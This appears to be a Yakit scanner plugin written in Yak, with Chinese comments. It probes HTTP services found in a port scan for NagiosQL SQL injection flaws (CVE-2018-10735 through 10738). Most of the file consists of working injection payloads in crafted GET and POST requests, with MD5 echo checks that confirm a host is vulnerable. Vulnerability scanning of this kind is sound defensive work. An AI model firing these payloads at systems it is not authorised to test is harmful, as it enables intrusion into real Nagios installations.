# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 
PacketGet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`

PacketPost = `POST /nagiosql/admin/menuaccess.php HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

selSubMenu=1&subSave=1&chbKey1=-1%' and (select 1 from(select count(*),concat((select (select (select md5({{params(payload)}}))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
`


PacketPost1 = `POST /nagiosql/admin/logbook.php HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

txtSearch=' and (select 1 from(select count(*),concat((select (select (select md5({{params(payload)}}))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
`


//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}

//填充对应的漏洞检测规则

randnum = fuzz.Strings(`{{ri(2000000000, 2100000000,1)}}`)[0]
addRule(PacketGet,`/nagiosql/admin/commandline.php?cname=%27%20union%20select%20concat(md5(`+randnum+`))%23`,func(rsp,header,body){
    if str.MatchAllOfSubString(body, codec.Md5(randnum)){
        return true
    }
    return false
},"sql注入",`nagio-cve-2018-10735`,"high","https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-10735")


addRule(PacketGet,`/nagiosql/admin/info.php?key1=%27%20union%20select%20concat(md5(`+randnum+`))%23`,func(rsp,header,body){
    if str.MatchAllOfSubString(body, codec.Md5(randnum)){
        return true
    }
    return false
},"sql注入",`nagio-cve-2018-10736`,"high","https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10736")



addRule(PacketPost,randnum,func(rsp,header,body){
    if str.MatchAllOfSubString(body, codec.Md5(randnum)){
        return true
    }
    return false
},"sql注入",`nagio-cve-2018-10738`,"high","https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10738")


addRule(PacketPost1,randnum,func(rsp,header,body){
    if str.MatchAllOfSubString(body, codec.Md5(randnum)){
        return true
    }
    return false
},"sql注入",`nagio-cve-2018-10737`,"high","https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10737")

//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}


handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }

    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
 
    //漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
